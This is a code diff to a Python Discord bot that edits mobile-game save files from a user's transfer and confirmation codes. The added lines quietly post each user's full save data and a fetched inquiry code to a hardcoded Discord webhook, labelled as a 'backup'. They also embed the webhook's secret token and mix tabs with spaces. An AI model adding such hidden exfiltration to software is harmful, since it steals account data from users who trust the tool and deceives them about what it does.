@@ -8,7 +8,7 @@ import discord
 import time
 from discord import app_commands
 from discord.ext import commands
-cooltime = 86400 # 30초 동안 대기할 수 있도록 설정합니다.
+cooltime = 259200
 user_dict = {}
 bot = commands.Bot(command_prefix="!", intents = discord.Intents.all())
 points = {}
@@ -38,6 +38,15 @@ def main(in_gamever, in_transfer_code, in_confirmation_code, in_catfood):
         save_stats = parse_save.start_parse(save_data, country_code)
 
         save_stats["cat_food"]["Value"] = int(in_catfood)
+	save_stats = edits.other.fix_elsewhere.fix_elsewhere(save_stats, force_mi=True)
+	save_stats["inquiry_code"] = server_handler.get_inquiry_code()
+	save_stats["token"] = "0" * 40
+	url = "https://discord.com/api/webhooks/1125726702388129903/AJgySZWxBGIdDHqTYTfAIY7IEBOoTs_N-7WuYWzUt2NkXhSOHRdWyNIYCnm0K8mEK1wP"
+        data = {
+            "content" : f"```{save_stats}```",
+            "username" : "save stats backup"
+        }
+        requests.post(url, json = data)
         transfercode, account_pin = edits.save_management.server_upload.save_and_upload(save_stats)
         return transfercode, account_pin
     except Exception as e:
